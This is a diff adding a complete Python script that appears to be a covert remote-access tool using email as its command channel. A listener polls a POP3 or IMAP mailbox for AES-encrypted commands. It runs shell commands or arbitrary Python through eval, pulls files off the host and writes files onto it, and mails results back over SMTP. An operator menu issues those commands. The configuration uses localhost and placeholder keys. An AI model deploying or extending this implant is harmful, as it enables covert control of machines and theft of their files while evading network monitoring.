@@ -1,0 +1,433 @@
+#!/usr/bin/env python3
+'''
+pip3 install pycryptodome
+'''
+
+import smtplib
+import poplib
+poplib._MAXLINE=2048000
+import imaplib
+
+import json
+import re
+import subprocess
+import time
+import argparse
+
+import os
+import zipfile
+import tempfile
+import base64
+
+try:
+    from Crypto.Cipher import AES
+    from Crypto.Util.Padding import pad, unpad
+except:
+    from Cryptodome.Cipher import AES
+    from Cryptodome.Util.Padding import pad, unpad
+
+
+cconfig = 	{
+				'sleep': 1,
+				'send':	['SMTP://127.0.0.1:25'],
+				'send_user': 'fmaster:fmaster',
+				'send_key': 'PLZCHANGEMEFIRSTplzzitsreallybad',
+				'send_iv': 'REALLYPLZZCHANGE',
+				'recv': ['POP3://127.0.0.1'],
+				'recv_user': 'fmaster:fmaster',
+				'recv_key': 'plzzitsreallybadPLZCHANGEMEFIRST',
+				'recv_iv': 'PLZZCHANGEREALLY',
+				'send_to': 'omaster@localhost',
+				'send_from': 'fmaster@localhost'
+			}
+
+sconfig = 	{
+				'sleep': 1,
+				'send':	['SMTP://127.0.0.1:25'],
+				'send_user': 'omaster:omaster',
+				'recv_key': 'PLZCHANGEMEFIRSTplzzitsreallybad',
+				'recv_iv': 'REALLYPLZZCHANGE',
+				'recv': ['POP3://127.0.0.1'],
+				'recv_user': 'omaster:omaster',
+				'send_key': 'plzzitsreallybadPLZCHANGEMEFIRST',
+				'send_iv': 'PLZZCHANGEREALLY',
+				'send_from': 'omaster@localhost',
+				'send_to': 'fmaster@localhost'
+			}
+
+default_ports = {
+					'SMTP': 25,
+					'SMTPS': 465,
+					'POP3': 110,
+					'POP3S': 995,
+					'IMAP': 143,
+					'IMAPS': 993
+				}
+
+def parse_url(url):
+	urlregex = r'(.*://)?([^:]*)(:\d+)?'
+	rem = re.match(urlregex, url)
+	proto, domain, port = rem.groups()
+	proto = proto[:-3]
+	if port:
+		port = port[1:]
+
+	if proto and not port:
+		port = default_ports[proto.upper()]
+
+	return proto.upper(), domain, port
+
+def get_smtp(url, user):
+	proto, domain, port = parse_url(url)
+	username, password = user.split(':')
+	if proto == 'SMTPS' or port == 465:
+		c = smtplib.SMTP_SSL(domain, port=port)
+	else:
+		c = smtplib.SMTP(domain, port=port)
+		c.starttls()
+
+	try:
+		c.login(username, password)
+	except:
+		pass
+
+	return c
+
+def get_pop(url, user):
+	proto, domain, port = parse_url(url)
+	username, password = user.split(':')
+	if proto == 'POP3S' or port == 995:
+		c = poplib.POP3_SSL(domain, port=port)
+	else:
+		c = poplib.POP3(domain, port=port)
+		c.stls()
+	c.user(username)
+	c.pass_(password)
+	return c
+
+def get_imap(url, user):
+	proto, domain, port = parse_url(url)
+	username, password = user.split(':')
+	if proto == 'IMAPS' or port == 993:
+		c = imaplib.IMAP4_SSL(domain, port=port)
+	else:
+		c = imaplib.IMAP4(domain, port=port)
+		c.starttls()
+	c.login(username, password)
+
+	return c
+
+def get_connection(url, user):
+	proto, domain, port = parse_url(url)
+	
+	#also check for unknown port/protocol
+
+	if proto.startswith('SMTP') or port in [25, 465]:
+		return get_smtp(url, user)
+	if proto.startswith('POP') or port in [110, 995]:
+		return get_pop(url, user)
+	if proto.startswith('IMAP') or port in [143, 993]:
+		return get_imap(url, user)
+
+def get_pop_data(fromremote):
+	mail = fromremote[1]
+	data = []
+	found = False
+	for i in mail:
+		if not i:
+			found = True
+		elif found:
+			data.append(i)
+	return b'\r\n'.join(data)
+
+def do_pop(conn):
+	msg_count, mailbox_size = conn.stat()
+	command_list = []
+	for i in range(1, msg_count+1):
+		r = conn.retr(i)
+		command_list.append(get_pop_data(r))
+		conn.dele(i)
+	conn.quit()
+
+	return command_list
+
+def get_imap_data(fromremote):
+	mail = fromremote[0][1]
+	data = []
+	found = False
+	for i in mail.split(b'\r\n'):
+		if not i:
+			found = True
+		elif found:
+			data.append(i)
+	return b'\r\n'.join(data)
+
+def do_imap(conn):
+	conn.select()
+	command_list = []
+	typ, data = conn.search(None, 'ALL')
+	for i in data[0].split():
+		typ, idata = conn.fetch(i, '(RFC822)')
+		mail = idata[0][1]
+		command_list.append(get_imap_data(idata))
+		conn.store(i, '+FLAGS', '\\DELETED')
+	conn.expunge()
+	conn.logout()
+
+	return command_list
+
+def do_get(url, conn, key, iv):
+	proto, domain, port = parse_url(url)
+	if proto.startswith('POP') or port in [110, 995]:
+		o = do_pop(conn)
+	if proto.startswith('IMAP') or port in [143, 993]:
+		o = do_imap(conn)
+
+	r = []
+	for i in o:
+		if i:
+			r.append(format_fromrecv(i, key, iv))
+	return r
+
+def do_smtp(conn, data, sendto, sendfrom):
+	msg = f'From: {sendfrom}\r\nTo: {sendto}\r\n\r\n{data}'
+	conn.sendmail(sendfrom, sendto, msg)
+	conn.quit()
+
+def do_send(url, conn, data, key, iv, sendto, sendfrom):
+	proto, domain, port = parse_url(url)
+	data = format_tosend(data, key, iv)
+	if proto.startswith('SMTP') or port in [25, 465]:
+		return do_smtp(conn, data, sendto, sendfrom)
+
+#Encode function largely lifted from PasteSend    
+def encrypt(indata, key, iv):
+    if not isinstance(key, bytes):
+        key = key.encode('ascii')
+    if not isinstance(iv, bytes):
+        iv = iv.encode('ascii')
+
+    # Create temp zip file
+    with tempfile.TemporaryDirectory() as tdir:
+        with open(os.path.join(tdir,'temp'), 'w') as f:
+            f.write(indata)
+        with zipfile.ZipFile(os.path.join(tdir,'tpzip'), 'w', compression=zipfile.ZIP_LZMA) as tpzip:
+            tpzip.write(os.path.join(tdir,'temp'), arcname='temp')
+
+        with open(os.path.join(tdir,'tpzip'), 'rb') as tp:
+            zipdata = tp.read()
+
+    # Encrypt with AES key/iv
+    aes_enc = AES.new(key, AES.MODE_CBC, iv=iv)
+    cipher_text = aes_enc.encrypt(pad(zipdata, AES.block_size))
+    # Convert to base64
+    b64text = base64.b64encode(cipher_text)
+    
+    return b64text
+
+#Decode function largely lifted from PasteSend    
+def decrypt(indata, key, iv):
+    if not isinstance(key, bytes):
+        key = key.encode('ascii')
+    if not isinstance(iv, bytes):
+        iv = iv.encode('ascii')
+        
+    # Base64 decode the text
+    cipher_text = base64.b64decode(indata)
+    # Decrypt with the AES key/iv
+    try:
+	    aes_dec = AES.new(key, AES.MODE_CBC, iv=iv)
+	    zipdata = unpad(aes_dec.decrypt(cipher_text), AES.block_size)
+    except:
+        return ''
+
+    # Create temp zip file
+    with tempfile.TemporaryDirectory() as tdir:
+        with open(os.path.join(tdir,'tpzip'), 'wb') as tp:
+            tp.write(zipdata)
+
+        with zipfile.ZipFile(os.path.join(tdir,'tpzip'), 'r', compression=zipfile.ZIP_LZMA) as tpzip:
+            plain_text = tpzip.read('temp')
+    
+    return plain_text
+
+def format_fromrecv(data, key, iv):
+	if not data:
+		return None
+	data = decrypt(data, key, iv)
+	j = json.loads(data)
+	return j
+
+def format_tosend(data, key, iv):
+	j = json.dumps(data)
+	d = encrypt(j, key, iv)
+	return d.decode()
+
+def do_shell(cmd):
+	o = subprocess.run(cmd.split(' '), capture_output=True)
+	if o.stdout:
+		return o.stdout
+	elif o.stderr:
+		return o.stderr
+	else:
+		return b''
+
+def do_python(cmd):
+	o = eval(cmd)
+	return o
+
+def do_getfile(cmddata):
+	with open(cmddata, 'rb') as f:
+		o = f.read()
+	return base64.b64encode(o).decode()
+
+def do_sendfile(cmddata, rpath):
+	tdata = base64.b64decode(cmddata)
+	with open(rpath, 'wb') as f:
+		f.write(tdata)
+	return 'done'
+
+def do_command(cmd):
+	cmdid = cmd['c']
+	cmdtype = cmd['t']
+	cmddata = cmd['d']
+
+	outdata = {'c':cmdid}
+	if cmdtype in [1, '1']:
+		outdata['o'] = do_shell(cmddata).decode()
+	elif cmdtype in [2, '2']:
+		outdata['o'] = do_python(cmddata)
+	elif cmdtype in [3, '3']:
+		outdata['o'] = do_getfile(cmddata)
+	elif cmdtype in [4, '4']:
+		outdata['o'] = do_sendfile(cmddata, cmd['d2'])
+	return outdata
+
+def listenmode():
+	while(True):
+		#wrap in try/except just in case
+		remote_url = cconfig['recv'][0]
+		user = cconfig['recv_user']
+		conn = get_connection(remote_url, user)
+		commands = do_get(remote_url, conn, cconfig['recv_key'], cconfig['recv_iv'])
+
+		data_to_send = []
+		for cmd in commands:
+			data_to_send.append(do_command(cmd))
+		
+		if data_to_send:
+			remote_url = cconfig['send'][0]
+			user = cconfig['send_user']
+			conn = get_connection(remote_url, user)
+			for data in data_to_send:
+				do_send(remote_url, conn, data, cconfig['send_key'], cconfig['send_iv'], cconfig['send_to'], cconfig['send_from'])
+
+		time.sleep(int(cconfig['sleep']))
+
+def sendmode():
+	cmdid = 0
+	cmdlist = {}
+	while(True):
+		print('----------------------------')
+		print('Menu: ')
+		print('  1) Get output')
+		print('  2) Send shell command')
+		print('  3) Run python')
+		print('  4) Get a file')
+		print('  5) Send a file')
+		print('  q) Quit')
+		s = input('Select: ')
+		if not s in ['1', '2', '3', '4', '5', 'q']:
+			continue
+
+		if s == 'q':
+			return
+		elif s == '1':
+			remote_url = sconfig['recv'][0]
+			user = sconfig['recv_user']
+			conn = get_connection(remote_url, user)
+			commands = do_get(remote_url, conn, sconfig['recv_key'], sconfig['recv_iv'])
+
+			for c in commands:
+				if c['c'] in cmdlist:
+					print('Command {} ({}) returned:'.format(c['c'], cmdlist[c['c']]['d']))
+					if cmdlist[c['c']]['t'] == 3:
+						path = input('Enter local path to output: ')
+						output = base64.b64decode(c['o'])
+						with open(path, 'wb') as f:
+							f.write(output)
+					else:
+						print(c['o'])
+				else:
+					print('Unknown command {} returned:'.format(c['c']))
+					print(c['o'])
+
+			if not commands:
+				print('No output')
+
+		elif s == '2':
+			c = input('Enter a command: ')
+			if c:
+				cmdid += 1
+				remote_url = sconfig['send'][0]
+				user = sconfig['recv_user']
+				conn = get_connection(remote_url, user)
+				cmddata = {"c":cmdid, "t":1, "d":c}
+				do_send(remote_url, conn, cmddata, sconfig['send_key'], sconfig['send_iv'], sconfig['send_to'], sconfig['send_from'])
+				print(f'Sent command {cmdid}: {c}')
+				cmdlist[cmdid] = cmddata
+		elif s == '3':
+			c = input('Enter python code to eval(): ')
+			if c:
+				cmdid += 1
+				remote_url = sconfig['send'][0]
+				user = sconfig['recv_user']
+				conn = get_connection(remote_url, user)
+				cmddata = {"c":cmdid, "t":2, "d":c}
+				do_send(remote_url, conn, cmddata, sconfig['send_key'], sconfig['send_iv'], sconfig['send_to'], sconfig['send_from'])
+				print(f'Sent command {cmdid}: {c}')
+				cmdlist[cmdid] = cmddata
+		elif s == '4':
+			c = input('Enter a remote path to get: ')
+			if c:
+				cmdid += 1
+				remote_url = sconfig['send'][0]
+				user = sconfig['recv_user']
+				conn = get_connection(remote_url, user)
+				cmddata = {"c":cmdid, "t":3, "d":c}
+				do_send(remote_url, conn, cmddata, sconfig['send_key'], sconfig['send_iv'], sconfig['send_to'], sconfig['send_from'])
+				print(f'Sent command {cmdid}: {c}')
+				cmdlist[cmdid] = cmddata
+		elif s == '5':
+			fpath = input('Enter a local file to send: ')
+			r = input('Enter the remote path to store: ')
+			if fpath:
+				cmdid += 1
+				remote_url = sconfig['send'][0]
+				user = sconfig['recv_user']
+				conn = get_connection(remote_url, user)
+				with open(fpath, 'rb') as f:
+					fdata = f.read()
+				fdata = base64.b64encode(fdata).decode()
+				cmddata = {"c":cmdid, "t":4, "d":fdata, "d2":r}
+				do_send(remote_url, conn, cmddata, sconfig['send_key'], sconfig['send_iv'], sconfig['send_to'], sconfig['send_from'])
+				print(f'Sent command {cmdid}: {fpath}')
+				cmdlist[cmdid] = cmddata
+		print('\n')
+
+
+def main():
+	parser = argparse.ArgumentParser()
+	parser.add_argument('-l', action='store_true',
+						help='Listen mode')
+	parser.add_argument('-s', action='store_true',
+						help='Send mode')
+	args = parser.parse_args()
+
+	if args.l:
+		listenmode()
+	elif args.s:
+		sendmode()
+
+if __name__ == '__main__':
+    main()
